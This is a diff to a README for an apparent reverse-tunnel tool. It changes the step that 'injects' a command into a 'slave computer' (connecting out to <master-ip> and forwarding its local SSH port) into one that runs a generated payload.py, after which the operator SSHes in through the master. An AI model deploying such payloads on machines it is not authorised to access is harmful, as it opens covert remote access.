@@ -38,15 +38,13 @@
         
     - `python3 createMaster.py`
 
- 5. **Inject command into slave computer** 
+ 5. **Inject python file into slave computer** 
 
-    Slave computer must have slaver_singlefile.py in current directory when executing. Either python version will work for this step.
+    Slave computer needs to execute the payload generated from createMaster.py. Either python version will work for this step.
     
-    -  `python3 slaver_singlefile.py -m <master-ip> -t 127.0.0.1:22`
-    -  `python slaver_singlefile.py -m <master-ip> -t 127.0.0.1:22`
+    -  `python3 payload.py` or `python payload.py`
  
  6. **Connect to Tunnelled Client**
 
     -  `ssh <user>@<master-ip> -p 10022`
-
 
